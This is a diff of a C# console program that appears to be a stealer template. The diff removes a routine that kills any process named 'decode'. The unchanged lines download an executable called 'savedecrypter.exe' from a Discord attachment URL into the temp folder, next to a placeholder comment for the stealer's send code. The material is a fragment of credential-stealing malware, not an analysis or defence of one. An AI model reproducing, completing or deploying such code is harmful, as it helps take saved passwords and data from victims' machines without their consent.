@@ -21,19 +21,8 @@ namespace ConsoleApp4
 
             //ur stealer send code :v
         }
-        public static void killfuck()
-        {
-            foreach (System.Diagnostics.Process myProc in System.Diagnostics.Process.GetProcesses())
-            {
-                if (myProc.ProcessName == "decode")
-                {
-                    myProc.Kill();
-                }
-            }
-        }
         static void Main(string[] args)
         {
-            killfuck();
             WebClient wc = new WebClient();
 
             wc.DownloadFile("https://cdn.discordapp.com/attachments/737682930146607104/737749127508525146/savedecrypter.exe", Path.GetTempPath() + "\\decode.exe");// amateurz's savedecrypter for 1 pass :D
